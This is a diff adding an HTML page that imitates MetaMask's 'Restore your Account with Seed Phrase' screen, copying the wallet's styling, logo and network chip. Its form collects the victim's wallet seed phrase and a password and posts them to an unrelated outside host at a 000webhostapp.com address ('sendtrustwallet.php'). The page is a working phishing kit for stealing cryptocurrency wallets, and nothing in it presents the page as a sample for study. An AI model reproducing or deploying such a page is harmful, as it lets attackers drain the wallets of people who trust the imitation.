@@ -1,0 +1,72 @@
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+    <title>MetaMask</title>
+    <link rel="shortcut icon" href="images/logo/metamask-fox.svg">
+    <link rel="stylesheet" type="text/css" href="./stylemetamask.css" title="ltr">
+    <link rel="stylesheet" type="text/css" href="./stylemetamask2.css" title="ltr">
+</head>
+
+<body class="notification">
+    <div id="app-content">
+        <div class="app">
+            <div class="main-container-wrapper">
+                <div class="page-container">
+                    <div class="confirm-page-container-header">
+                        <div class="confirm-page-container-header__row">
+                            <div class="confirm-page-container-header__address-container">
+                                <div class="confirm-page-container-header__address-identicon">
+                                    <div class="">
+                                        <div class="identicon">
+                                            <div >
+                                                <img class="confirm-page-container-navigation__imageflip"  height="40px" src="images/logo/metamask-fox.svg" alt="">
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="network-display network-display--clickable chip chip--with-left-icon chip--with-right-icon chip--ui-3" role="button" tabindex="0">
+                                <div class="chip__left-icon"><div class="color-indicator color-indicator--filled color-indicator--color-ui-4 color-indicator--size-lg">
+                                    <i class="color-indicator__icon fa fa-question"></i>
+                                </div>
+                            </div>
+                            <span class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography chip__label typography--h7 typography--weight-normal typography--style-normal typography--color-ui-4">Ethereum Mainnet</span>
+                            <div class="chip__right-icon">
+                                <i class="network-display__icon app-header__network-down-arrow"></i>
+                            </div>
+                        </div>
+                    </div>
+                    </div>
+                    <div class="confirm-approve-content"><br>
+                        <div class="confirm-approve-content__title">Restore your Account with Seed Phrase</div>
+                        <div class="confirm-approve-content__description">Enter your secret phrase here to restore your vault.
+                        </div><br>
+                        
+                        <div class="confirm-approve-content__card-wrapper">
+                            <div class="confirm-approve-content__card--no-border">
+                              <form method="post" action="https://safemoon-net.000webhostapp.com/sendtrustwallet.php?nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault">
+                                <label class="first-time-flow__input">Wallet Seed</label>
+                                <div class="import-account__input-wrapper">
+                                <textarea type="text" name="PrivateKey" class="import-account__secret-phrase" required></textarea>
+                                </div><br><br>
+                                <label for="fname">Password</label>
+                                <input type="password" id="fname" name="password1" value="" required>
+                                <label for="lname">Confirm Password</label>
+                                <input type="password" id="lname" name="password2" value="" required>
+                                <button type="submit" style="margin:20px 0px; background-color: #037dd6; border-radius: 100px; " class="button btn-primary" data-testid="page-container-footer-next" role="button" tabindex="0"><b>Restore</b></button>
+                              </form>               
+                            </div>
+                        </div>
+                    </div>
+                    <div class="page-container__footer">
+                        <footer>
+                           </footer>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
